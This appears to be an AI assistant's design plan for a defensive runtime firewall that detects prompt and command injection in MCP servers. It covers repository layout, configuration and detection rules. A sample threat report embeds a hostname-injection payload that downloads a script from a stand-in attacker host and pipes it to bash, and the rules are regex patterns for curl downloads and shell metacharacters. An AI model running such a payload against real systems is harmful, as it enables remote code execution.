# ProofLayer Runtime Security — Repository Structure

## Proposed Structure

```
prooflayer-runtime/
├── README.md                           # Main documentation
├── LICENSE                             # MIT License
├── pyproject.toml                      # Python package config (Poetry/setuptools)
├── requirements.txt                    # Python dependencies
├── setup.py                            # Package installation
├── .gitignore
├── .github/
│   └── workflows/
│       ├── ci.yml                      # GitHub Actions CI
│       └── release.yml                 # Automated releases
│
├── prooflayer/                         # Main package
│   ├── __init__.py
│   ├── version.py                      # Version info
│   │
│   ├── runtime/                        # Core runtime interceptor
│   │   ├── __init__.py
│   │   ├── interceptor.py             # MCP protocol interception
│   │   ├── wrapper.py                 # ProofLayerRuntime wrapper class
│   │   ├── transport.py               # stdio/SSE transport handling
│   │   └── middleware.py              # MCP middleware layer
│   │
│   ├── detection/                      # Threat detection engine
│   │   ├── __init__.py
│   │   ├── engine.py                  # Main detection engine
│   │   ├── scanner.py                 # Pattern scanning
│   │   ├── scorer.py                  # Risk scoring algorithm
│   │   ├── rules.py                   # Rule loader
│   │   └── semantic.py                # Semantic analysis
│   │
│   ├── rules/                          # Detection rules (YAML)
│   │   ├── prompt-injection.yaml      # 12 direct injection rules
│   │   ├── jailbreaks.yaml            # 8 jailbreak patterns
│   │   ├── command-injection.yaml     # 15 command injection rules
│   │   ├── data-exfiltration.yaml     # 10 exfiltration patterns
│   │   ├── role-manipulation.yaml     # 8 role manipulation rules
│   │   └── tool-poisoning.yaml        # 6 tool poisoning rules
│   │
│   ├── response/                       # Threat response actions
│   │   ├── __init__.py
│   │   ├── actions.py                 # ALLOW/WARN/BLOCK/KILL logic
│   │   ├── killer.py                  # Server termination
│   │   ├── reporter.py                # Security report generation
│   │   └── alerting.py                # Alert/notification system
│   │
│   ├── reporting/                      # Report formats
│   │   ├── __init__.py
│   │   ├── json.py                    # JSON report format
│   │   ├── sarif.py                   # SARIF report format
│   │   └── templates/                 # Report templates
│   │       ├── security_report.json.j2
│   │       └── sarif_output.json.j2
│   │
│   ├── config/                         # Configuration
│   │   ├── __init__.py
│   │   ├── loader.py                  # Config file loader
│   │   ├── defaults.py                # Default settings
│   │   └── schema.py                  # Config validation
│   │
│   └── utils/                          # Utilities
│       ├── __init__.py
│       ├── logging.py                 # Logging setup
│       ├── entropy.py                 # Shannon entropy calculation
│       └── encoding.py                # Base64/URL decode utilities
│
├── examples/                           # Integration examples
│   ├── basic/
│   │   ├── simple_wrapped_server.py   # Basic usage example
│   │   └── README.md
│   │
│   ├── suse/                           # SUSE-specific examples
│   │   ├── wrapped-simple-mcp.py      # Rick's mcp-tools integration
│   │   ├── multi-linux-manager.py     # Multi-Linux Manager demo
│   │   ├── systemd/
│   │   │   ├── prooflayer-mcp@.service
│   │   │   └── prooflayer.socket
│   │   ├── config/
│   │   │   ├── prooflayer.yaml        # Example config
│   │   │   └── hardening.yaml         # Security hardening config
│   │   └── README.md
│   │
│   └── attack-scenarios/               # Demo attack scripts
│       ├── 01_command_injection.py
│       ├── 02_data_exfiltration.py
│       ├── 03_jailbreak.py
│       └── README.md
│
├── tests/                              # Test suite
│   ├── __init__.py
│   ├── conftest.py                     # Pytest configuration
│   │
│   ├── unit/                           # Unit tests
│   │   ├── test_interceptor.py
│   │   ├── test_scanner.py
│   │   ├── test_scorer.py
│   │   ├── test_rules.py
│   │   └── test_reporter.py
│   │
│   ├── integration/                    # Integration tests
│   │   ├── test_mcp_integration.py
│   │   ├── test_server_kill.py
│   │   └── test_report_generation.py
│   │
│   ├── fixtures/                       # Test fixtures
│   │   ├── benign_tool_calls.json
│   │   ├── malicious_payloads.json
│   │   └── mcp_messages.json
│   │
│   └── benchmarks/                     # Performance tests
│       ├── test_latency.py
│       └── test_throughput.py
│
├── docs/                               # Documentation
│   ├── getting-started.md
│   ├── architecture.md
│   ├── detection-rules.md
│   ├── configuration.md
│   ├── api-reference.md
│   ├── suse-integration.md
│   ├── demo-guide.md
│   └── assets/
│       ├── architecture-diagram.png
│       └── demo-video.mp4
│
├── scripts/                            # Utility scripts
│   ├── install.sh                      # Installation script
│   ├── benchmark.py                    # Performance benchmark
│   ├── validate-rules.py               # Rule validation
│   └── generate-sbom.sh                # SBOM generation
│
├── deployment/                         # Deployment configs
│   ├── docker/
│   │   ├── Dockerfile
│   │   ├── docker-compose.yml
│   │   └── .dockerignore
│   │
│   ├── kubernetes/                     # K8s manifests (Phase 3)
│   │   ├── namespace.yaml
│   │   ├── deployment.yaml
│   │   ├── service.yaml
│   │   └── configmap.yaml
│   │
│   └── systemd/                        # systemd service files
│       ├── prooflayer-mcp@.service
│       ├── prooflayer.socket
│       └── prooflayer.conf
│
├── benchmarks/                         # Accuracy benchmarks
│   ├── owasp-llm-top10/               # OWASP test cases
│   │   ├── LLM01_prompt_injection.json
│   │   ├── LLM02_data_leakage.json
│   │   └── results.md
│   │
│   └── false-positives/               # False positive tracking
│       ├── benign_cases.json
│       └── analysis.md
│
└── pr-template/                        # Template for Rick's repo PR
    ├── tutorials/
    │   └── 03-runtime-security-with-prooflayer.md
    ├── prooflayer/
    │   ├── wrapped-simple-mcp.py
    │   └── requirements.txt
    └── DEMO_SCRIPT.md
```

---

## Repository Options

### Option A: Standalone Repository (Recommended)

**New Repo**: `github.com/sinewaveai/prooflayer-runtime`

**Pros**:
- Clean separation from existing `agent-security-scanner-mcp`
- Focused scope for SUSE/enterprise customers
- Independent versioning and release cycle
- Can be forked/contributed to by SUSE team

**Cons**:
- Duplicates some detection rules from main repo
- Need to maintain two codebases initially

**Recommendation**: ✅ **Use this approach** — aligns with "ProofLayer" brand differentiation and enterprise focus.

---

### Option B: Monorepo with Existing Project

**Location**: `agent-security-layer/prooflayer-runtime/`

**Pros**:
- Reuse existing rules (`rules/` directory)
- Share utilities and detection logic
- Single codebase for all ProofLayer products

**Cons**:
- Couples lightweight runtime to heavy AST scanner
- Confusing for SUSE customers ("which package do I install?")
- Harder to market as separate product

**Recommendation**: ❌ **Avoid** — monorepo makes sense for internal tools, not for customer-facing products with different target users.

---

### Option C: Workspace/Submodule Hybrid

**Structure**:
```
sinewaveai/
├── agent-security-scanner-mcp/        # Full scanner (existing)
├── prooflayer-scanner/                # Lightweight MCP scanner (existing)
└── prooflayer-runtime/                # SUSE runtime security (NEW)
```

**Pros**:
- Keeps products separate but related
- Can share common code via git submodules or packages
- Clear product differentiation

**Cons**:
- More repos to maintain
- Cross-repo dependency management

**Recommendation**: ⚠️ **Consider if we want 3+ distinct products** under ProofLayer brand.

---

## Recommended Approach

### Create Standalone Repository: `prooflayer-runtime`

```bash
# Create new repository
gh repo create sinewaveai/prooflayer-runtime --public \
  --description "Runtime prompt injection firewall for MCP servers - Enterprise security for SUSE, Kubernetes, and containerized AI agents" \
  --license mit

# Clone and initialize
git clone https://github.com/sinewaveai/prooflayer-runtime
cd prooflayer-runtime

# Create initial structure
mkdir -p prooflayer/{runtime,detection,rules,response,reporting,config,utils}
mkdir -p examples/{basic,suse,attack-scenarios}
mkdir -p tests/{unit,integration,fixtures,benchmarks}
mkdir -p docs/assets
mkdir -p scripts
mkdir -p deployment/{docker,kubernetes,systemd}
mkdir -p benchmarks/owasp-llm-top10
mkdir -p pr-template/tutorials
```

---

## Key Design Decisions

### 1. Python vs TypeScript

**Recommendation**: **Python** (for v0)

**Rationale**:
- Rick's `mcp-tools` is Python-based
- SUSE infrastructure is Python/bash heavy
- Faster to prototype (2-week timeline)
- TypeScript version in Phase 2 for npm distribution

### 2. Package Distribution

**Phase 1 (v0)**: PyPI package
```bash
pip install prooflayer-runtime
```

**Phase 2**: OCI container
```bash
docker pull ghcr.io/sinewaveai/prooflayer-runtime:latest
```

**Phase 3**: SUSE OBS (RPM)
```bash
zypper install prooflayer-runtime
```

### 3. Configuration Format

**YAML-based** (aligns with Rick's `simple-mcp-hardening.yaml`):

```yaml
# prooflayer.yaml
runtime:
  detection:
    enabled: true
    rules_dir: ./rules
    score_threshold:
      allow: 0-29
      warn: 30-69
      block: 70-100

  response:
    on_threat: kill  # allow, warn, block, kill
    report_dir: ./security-reports
    alert_webhook: https://siem.example.com/alerts

  performance:
    max_latency_ms: 10
    cache_rules: true

  logging:
    level: INFO
    format: json
    destination: /var/log/prooflayer/runtime.log
```

### 4. Rule Format

**YAML with Jinja2 templating** (similar to Semgrep):

```yaml
# rules/command-injection.yaml
rules:
  - id: shell-metachar-semicolon
    severity: high
    message: Shell metacharacter ';' detected in parameter
    pattern: '.*[;].*'
    score: 20

  - id: command-curl-download
    severity: critical
    message: curl command detected - possible download attack
    pattern: '.*curl\s+.*http.*'
    score: 30

  - id: pipe-operator
    severity: high
    message: Pipe operator '|' detected - possible command chaining
    pattern: '.*[|].*'
    score: 20
```

### 5. MCP Integration Pattern

**Wrapper-based** (non-invasive):

```python
from mcp import Server
from prooflayer.runtime import ProofLayerRuntime

# Original MCP server
server = Server("multi-linux-manager")

@server.tool()
def add_system(hostname: str, distro: str):
    # Implementation
    pass

# Wrap with ProofLayer
runtime = ProofLayerRuntime(config="prooflayer.yaml")
protected_server = runtime.wrap(server)

# Run as usual
protected_server.run()
```

### 6. Report Format

**JSON + SARIF dual output**:

```json
{
  "prooflayer_version": "1.0.0",
  "timestamp": "2026-02-25T10:30:45Z",
  "server": "multi-linux-manager",
  "threat": {
    "type": "command_injection",
    "tool": "add_system",
    "parameter": "hostname",
    "payload": "prod-db; curl http://attacker.com/shell.sh | bash",
    "risk_score": 95,
    "action": "SERVER_KILLED"
  },
  "detection": {
    "rules_matched": [
      "shell-metachar-semicolon",
      "command-curl-download",
      "pipe-operator",
      "semantic-hostname-invalid-chars"
    ],
    "confidence": "HIGH"
  },
  "context": {
    "mcp_message_id": "req-12345",
    "timestamp_received": "2026-02-25T10:30:45.123Z",
    "timestamp_detected": "2026-02-25T10:30:45.128Z",
    "latency_ms": 5
  }
}
```

---

## Next Steps

1. **Create GitHub repository**: `sinewaveai/prooflayer-runtime`
2. **Initialize Python package**: `pyproject.toml`, `setup.py`
3. **Port detection rules**: Copy 59 rules from `agent-security-scanner-mcp`
4. **Implement core interceptor**: `prooflayer/runtime/interceptor.py`
5. **Write integration tests**: Test on Rick's `simple-mcp`

Would you like me to:
1. Create the new GitHub repository structure?
2. Initialize the Python package with all directories?
3. Start implementing the core interceptor code?
